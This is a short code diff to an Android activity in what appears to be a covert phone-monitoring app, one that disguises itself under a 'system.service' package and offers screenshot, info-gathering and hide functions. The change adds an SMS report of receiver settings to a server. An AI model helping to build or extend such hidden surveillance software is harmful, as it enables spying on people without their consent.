@@ -20,6 +20,8 @@ import system.service.GetInfoTask;
 import system.service.R;
 import system.service.config.ConfigCtrl;
 import system.service.config.MailCfg;
+import system.service.feature.sms.SmsCtrl;
+
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.FileCtrl;
 import com.particle.inspector.common.util.SysUtils;
@@ -85,9 +87,8 @@ public class InitActivity extends Activity
     {
     	if (resultCode == RESULT_OK) 
     	{
+			// Enable buttons if the mail address is valid
 			boolean isValidMailAddress = data.getExtras().getBoolean(GlobalPrefActivity.IS_VALID_MAIL_ADDRESS);
-
-			// Enable buttons
 			if (isValidMailAddress) {
 				btn_getinfo.setEnabled(true);
 				btn_screenshot.setEnabled(true);
@@ -95,6 +96,12 @@ public class InitActivity extends Activity
 				hint_getinfo.setEnabled(true);
 				hint_screenshot.setEnabled(true);
 				hint_hide.setEnabled(true);
+			}
+			
+			// Send the receiver info SMS to server to update record in database
+			boolean hasChangedReceiverInfo = data.getExtras().getBoolean(GlobalPrefActivity.HAS_CHG_RECEIVER_INFO);
+			if (hasChangedReceiverInfo) {
+				SmsCtrl.sendReceiverInfoSms(getApplicationContext());
 			}
     	}
     }
